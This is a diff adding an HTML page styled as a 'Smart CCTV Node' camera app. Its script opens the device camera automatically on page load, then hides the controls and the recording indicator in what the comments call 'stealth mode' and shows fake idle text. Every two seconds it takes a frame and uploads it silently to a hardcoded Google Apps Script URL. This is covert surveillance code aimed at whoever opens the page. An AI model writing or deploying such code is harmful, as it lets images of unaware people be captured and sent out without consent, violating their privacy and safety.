@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart CCTV Node</title>
+    <style>
+        :root {
+            --bg-base: #0a0a0a;
+            --panel-bg: #111111;
+            --panel-border: #333333;
+            --primary: #00ff41; /* Hacker Green */
+            --danger: #ff2a2a;
+            --text-main: #e0e0e0;
+            --text-muted: #888888;
+            --font-mono: 'Courier New', Courier, monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-main);
+            font-family: var(--font-mono);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Top Header Area */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: var(--panel-bg);
+            border-bottom: 1px solid var(--panel-border);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
+        }
+
+        .brand {
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            color: var(--primary);
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+        }
+
+        .status-bar {
+            display: flex;
+            gap: 20px;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+            background-color: #555;
+            box-shadow: 0 0 5px rgba(0,0,0,0.5);
+        }
+
+        .dot.live {
+            background-color: var(--danger);
+            box-shadow: 0 0 8px var(--danger);
+            animation: pulse 1.5s infinite;
+        }
+
+        .dot.connected {
+            background-color: var(--primary);
+            box-shadow: 0 0 8px var(--primary);
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        /* Main Content Layout */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            gap: 20px;
+            max-width: 900px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Configuration Warning */
+        #config-warning {
+            background: rgba(255, 165, 0, 0.1);
+            border: 1px solid orange;
+            color: #ffcc00;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            display: block; /* Shown by default if URL isn't configured */
+        }
+
+        #config-warning code {
+            background: rgba(0,0,0,0.3);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        /* Camera Feed Container */
+        .feed-wrapper {
+            position: relative;
+            width: 100%;
+            background-color: #000;
+            border: 2px solid var(--panel-border);
+            border-radius: 8px;
+            overflow: hidden;
+            aspect-ratio: 4/3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        canvas { display: none; } /* Hidden until photo is captured */
+
+        .overlay-ui {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            display: flex;
+            justify-content: space-between;
+            pointer-events: none; /* Let clicks pass through */
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .overlay-rec {
+            color: var(--danger);
+            font-weight: bold;
+            display: none;
+            align-items: center;
+        }
+        .overlay-rec::before {
+            content: '';
+            display: inline-block;
+            width: 10px; height: 10px;
+            background: var(--danger);
+            border-radius: 50%;
+            margin-right: 5px;
+            animation: pulse 1s infinite;
+        }
+
+        /* Controls Section */
+        .controls-panel {
+            background-color: var(--panel-bg);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--panel-border);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .button-row {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        button {
+            flex: 1;
+            min-width: 120px;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        button:active:not(:disabled) {
+            transform: translateY(2px);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .btn-start { background-color: #2a2a2a; color: white; border: 1px solid #444; }
+        .btn-start:hover:not(:disabled) { background-color: #333; }
+
+        .btn-capture { background-color: var(--primary); color: #000; display: none; }
+        .btn-capture:hover:not(:disabled) { background-color: #00cc33; box-shadow: 0 0 10px rgba(0,255,65,0.4); }
+
+        .btn-switch { background-color: #444; color: white; display: none; }
+        .btn-switch:hover:not(:disabled) { background-color: #555; }
+
+        /* Confirmation Group */
+        .confirm-actions {
+            display: none; /* Shown during preview phase */
+            width: 100%;
+            gap: 15px;
+        }
+
+        .btn-upload { background-color: #0066ff; color: white; flex: 2; }
+        .btn-upload:hover:not(:disabled) { background-color: #005ce6; box-shadow: 0 0 10px rgba(0,102,255,0.4); }
+
+        .btn-retake { background-color: var(--danger); color: white; flex: 1; }
+        .btn-retake:hover:not(:disabled) { background-color: #e60000; }
+
+        .status-message {
+            text-align: center;
+            font-size: 0.9rem;
+            min-height: 1.2rem;
+            color: var(--text-muted);
+        }
+
+        /* Recent Uploads Gallery */
+        .gallery-panel {
+            background-color: var(--panel-bg);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid var(--panel-border);
+        }
+
+        .gallery-header {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            border-bottom: 1px solid #333;
+            padding-bottom: 8px;
+        }
+
+        .gallery-list {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            padding-bottom: 10px;
+        }
+
+        .gallery-list img {
+            height: 70px;
+            width: 90px;
+            object-fit: cover;
+            border: 1px solid #444;
+            border-radius: 4px;
+            opacity: 0.8;
+            transition: opacity 0.2s;
+        }
+        .gallery-list img:hover {
+            opacity: 1;
+        }
+        
+        .gallery-empty {
+            color: #555;
+            font-size: 0.85rem;
+            font-style: italic;
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar { height: 8px; width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-base); }
+        ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #555; }
+
+        @media (max-width: 600px) {
+            header { flex-direction: column; gap: 12px; align-items: flex-start; }
+            .button-row { flex-direction: column; }
+            .confirm-actions { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand">SYS.CAM_NODE</div>
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="dot" id="cam-status"></div>
+                <span id="cam-status-text">CAM OFFLINE</span>
+            </div>
+            <div class="status-item">
+                <div class="dot connected" id="cloud-status"></div>
+                <span>CLOUD SYNC</span>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Important: Developer must configure this URL -->
+        <div id="config-warning">
+            <strong>Action Required:</strong> Please replace <code>YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL</code> in the source code with your deployed Google Apps Script Web App URL to enable cloud saving.
+        </div>
+
+        <div class="feed-wrapper">
+            <!-- Video feed element -->
+            <video id="video" autoplay playsinline muted></video>
+            <!-- Canvas for capturing and previewing photos -->
+            <canvas id="canvas"></canvas>
+            
+            <div class="overlay-ui">
+                <div class="overlay-rec" id="overlay-rec">REC</div>
+                <div id="overlay-time">--:--:--</div>
+            </div>
+        </div>
+
+        <div class="controls-panel">
+            <div class="status-message" id="action-status">Ready for operation.</div>
+            
+            <div class="button-row" id="primary-controls">
+                <button class="btn-start" id="btn-start">Initialize Camera</button>
+                <button class="btn-switch" id="btn-switch">Switch Cam</button>
+                <button class="btn-capture" id="btn-capture">Capture Photo</button>
+            </div>
+
+            <div class="confirm-actions" id="confirm-controls">
+                <button class="btn-retake" id="btn-retake">Retake</button>
+                <button class="btn-upload" id="btn-upload">Confirm & Secure Upload</button>
+            </div>
+        </div>
+
+        <div class="gallery-panel">
+            <div class="gallery-header">Recent Uploads (Session)</div>
+            <div class="gallery-list" id="gallery-list">
+                <div class="gallery-empty" id="gallery-empty">No photos uploaded in this session.</div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        // IMPORTANT: Replace this with your Google Apps Script Web App URL
+        const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 
+        
+        // Hide warning if URL is configured
+        if (GAS_WEB_APP_URL !== "YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL" && GAS_WEB_APP_URL.startsWith("https://script.google.com")) {
+            document.getElementById('config-warning').style.display = 'none';
+        }
+
+        // ==========================================
+        // DOM Elements
+        // ==========================================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        const btnStart = document.getElementById('btn-start');
+        const btnCapture = document.getElementById('btn-capture');
+        const btnSwitch = document.getElementById('btn-switch');
+        const btnRetake = document.getElementById('btn-retake');
+        const btnUpload = document.getElementById('btn-upload');
+        
+        const primaryControls = document.getElementById('primary-controls');
+        const confirmControls = document.getElementById('confirm-controls');
+        
+        const camStatusDot = document.getElementById('cam-status');
+        const camStatusText = document.getElementById('cam-status-text');
+        const overlayRec = document.getElementById('overlay-rec');
+        const overlayTime = document.getElementById('overlay-time');
+        const actionStatus = document.getElementById('action-status');
+        
+        const galleryList = document.getElementById('gallery-list');
+        const galleryEmpty = document.getElementById('gallery-empty');
+
+        // ==========================================
+        // State
+        // ==========================================
+        let stream = null;
+        let useFrontCamera = false;
+        let isAutoCapturing = false;
+
+        // ==========================================
+        // Clock Updates
+        // ==========================================
+        function updateClock() {
+            const now = new Date();
+            overlayTime.textContent = now.toISOString().split('T')[1].split('.')[0] + " Z";
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ==========================================
+        // Auto-Start on Load
+        // ==========================================
+        window.addEventListener('load', () => {
+            initCamera();
+        });
+
+        // ==========================================
+        // Camera Functions
+        // ==========================================
+        async function initCamera() {
+            if (stream) {
+                stopCamera(); // Clean up existing stream if switching
+                return;
+            }
+
+            try {
+                actionStatus.textContent = "Requesting camera permissions...";
+                actionStatus.style.color = "var(--text-muted)";
+                
+                const constraints = {
+                    video: {
+                        facingMode: useFrontCamera ? "user" : "environment",
+                        width: { ideal: 1280 }, // Lowered slightly for faster uploads
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // Update UI for stealth mode (Hide buttons so user doesn't know it's capturing)
+                    btnStart.style.display = "none";
+                    btnSwitch.style.display = "none";
+                    btnCapture.style.display = "none"; 
+                    
+                    camStatusDot.classList.add("live");
+                    camStatusText.textContent = "CAM LIVE";
+                    camStatusText.style.color = "var(--danger)";
+                    overlayRec.style.display = "none"; // Hide the REC dot
+                    
+                    // Show a completely normal, fake idle text
+                    actionStatus.textContent = "System initialized. Waiting for action...";
+                    
+                    checkCameraDevices();
+                    
+                    // Start automatic loop
+                    isAutoCapturing = true;
+                    startAutoCaptureLoop();
+                };
+            } catch (err) {
+                console.error("Camera access error:", err);
+                actionStatus.textContent = "Error: Camera access denied or unavailable.";
+                actionStatus.style.color = "var(--danger)";
+            }
+        }
+
+        function stopCamera() {
+            isAutoCapturing = false;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                video.srcObject = null;
+                
+                // Update UI
+                btnStart.textContent = "Initialize Camera";
+                btnStart.style.backgroundColor = "#2a2a2a";
+                btnStart.style.color = "white";
+                
+                btnSwitch.style.display = "none";
+                
+                camStatusDot.classList.remove("live");
+                camStatusText.textContent = "CAM OFFLINE";
+                camStatusText.style.color = "var(--text-muted)";
+                overlayRec.style.display = "none";
+                
+                actionStatus.textContent = "Camera disabled. Auto-capture stopped.";
+            }
+        }
+
+        async function checkCameraDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoInputs = devices.filter(device => device.kind === 'videoinput');
+                if (videoInputs.length <= 1) {
+                    btnSwitch.style.display = "none";
+                }
+            } catch (err) {
+                console.error("Error enumerating devices:", err);
+            }
+        }
+
+        // ==========================================
+        // Automatic Capture & Upload Loop
+        // ==========================================
+        async function startAutoCaptureLoop() {
+            while (isAutoCapturing) {
+                // Wait for 2 seconds
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                if (!isAutoCapturing || !stream) break;
+                
+                // Capture frame silently
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Compress image to 60% quality so it uploads quickly
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // Upload silently
+                silentUpload(dataUrl);
+            }
+        }
+
+        async function silentUpload(dataUrl) {
+            if (GAS_WEB_APP_URL === "YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL") return;
+
+            const now = new Date();
+            const timestamp = now.toISOString().replace(/[:.]/g, '-');
+            const filename = `CCTV_AUTO_${timestamp}.jpg`;
+
+            const payload = {
+                filename: filename,
+                mimeType: 'image/jpeg',
+                base64: dataUrl
+            };
+
+            try {
+                const response = await fetch(GAS_WEB_APP_URL, {
+                    method: 'POST',
+                    body: JSON.stringify(payload),
+                    headers: { 'Content-Type': 'text/plain;charset=utf-8' }
+                });
+
+                const result = await response.json();
+                if (result.status === "success") {
+                    addPhotoToGallery(dataUrl);
+                }
+            } catch (error) {
+                console.error("Auto-upload error:", error);
+            }
+        }
+
+        function addPhotoToGallery(dataUrl) {
+            if (galleryEmpty.style.display !== 'none') {
+                galleryEmpty.style.display = 'none';
+            }
+            
+            const img = document.createElement('img');
+            img.src = dataUrl;
+            img.alt = "Uploaded Photo";
+            
+            // Add to beginning of list
+            galleryList.insertBefore(img, galleryList.firstChild);
+            
+            // Limit gallery to last 20 images to save memory
+            if (galleryList.children.length > 20) {
+                galleryList.removeChild(galleryList.lastChild);
+            }
+        }
+
+        // ==========================================
+        // Event Listeners
+        // ==========================================
+        btnStart.addEventListener('click', () => {
+            if (stream) stopCamera();
+            else initCamera();
+        });
+
+        btnSwitch.addEventListener('click', () => {
+            useFrontCamera = !useFrontCamera;
+            initCamera(); 
+        });
+        
+    </script>
+</body>
+</html>
